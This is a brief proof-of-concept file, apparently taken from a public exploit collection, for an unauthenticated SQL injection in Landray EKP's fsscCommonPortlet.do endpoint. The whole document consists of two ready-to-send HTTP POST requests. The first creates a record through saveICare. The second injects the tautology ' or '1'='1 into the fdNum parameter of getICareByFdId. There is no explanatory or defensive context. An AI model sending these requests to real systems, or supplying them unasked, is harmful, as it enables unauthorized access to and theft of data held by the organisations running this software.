# landray_fsscCommonPortlet.do_sqli

from: https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9FfsscCommonPortlet.do%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

product: 蓝凌EKP

```
POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

method=saveICare&fdId=&fdNum=1&docSubject=1&fdName=1&createTime=1&fdStatus=1

POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

method=getICareByFdId&fdNum=asdasd'+or+'1'='1&ordertype=down
```
